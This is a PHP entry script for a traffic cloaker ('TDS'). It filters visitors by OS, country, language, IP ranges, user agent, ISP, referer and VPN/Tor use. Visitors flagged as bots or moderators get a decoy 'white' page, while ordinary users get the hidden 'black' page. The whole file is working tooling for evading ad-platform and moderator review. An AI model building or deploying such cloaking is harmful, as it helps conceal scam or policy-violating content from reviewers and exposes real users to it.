<?php
ob_start(); // Start output buffering

// Enable debugging
ini_set('display_errors', '1');
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Include necessary files
require_once 'core.php';
require_once 'settings.php';
require_once 'db.php';
require_once 'main.php';

// Initialize Cloaker
$cloaker = new Cloaker(
    $os_white,
    $country_white,
    $lang_white,
    $ip_black_filename,
    $ip_black_cidr,
    $tokens_black,
    $url_should_contain,
    $ua_black,
    $isp_black,
    $block_without_referer,
    $referer_stopwords,
    $block_vpnandtor
);

// Debugging: Print TDS Mode
echo "TDS Mode: $tds_mode<br>";

// Full cloaking mode: Redirect all users to white page
if ($tds_mode == 'full') {
    echo "Full cloaking mode enabled<br>";
    add_white_click($cloaker->detect, ['fullcloak']);
    white(false);
    return;
}

// Check for JavaScript-based checks
if ($use_js_checks === true) {
    echo "JavaScript checks enabled<br>";
    white(true);
} else {
    // Perform cloaker check
    $check_result = $cloaker->check();
    echo "Cloaker Check Result: " . $check_result . "<br>";

    if ($check_result == 0 || $tds_mode === 'off') {
        // Regular user or filtering is off
        echo "Regular user detected or filtering is off<br>";
        black($cloaker->detect);
        return;
    } else {
        // Bot or moderator detected
        echo "Bot or moderator detected<br>";
        add_white_click($cloaker->detect, $cloaker->result);
        white(false);
        return;
    }
}

ob_end_flush(); // Send the output buffer
?>
